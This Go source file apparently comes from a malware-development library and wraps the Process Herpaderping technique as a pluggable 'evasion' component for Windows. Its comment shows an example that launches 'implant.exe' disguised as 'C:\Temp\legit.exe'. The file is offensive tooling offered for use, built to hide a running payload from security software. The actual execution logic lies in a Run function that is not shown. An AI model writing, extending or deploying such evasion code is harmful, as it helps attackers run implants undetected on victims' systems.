//go:build windows

package herpaderping

import "github.com/oioio-space/maldev/evasion"

type herpaTechnique struct{ cfg Config }

func (t *herpaTechnique) Name() string              { return "herpaderping" }
func (t *herpaTechnique) Apply(_ evasion.Caller) error { return Run(t.cfg) }

// Technique returns an evasion.Technique that executes a PE via Process Herpaderping.
//
// Example:
//
//	techniques := []evasion.Technique{
//	    herpaderping.Technique(herpaderping.Config{
//	        PayloadPath: "implant.exe",
//	        TargetPath:  `C:\Temp\legit.exe`,
//	    }),
//	}
//	evasion.ApplyAll(techniques, nil)
func Technique(cfg Config) evasion.Technique {
	return &herpaTechnique{cfg: cfg}
}
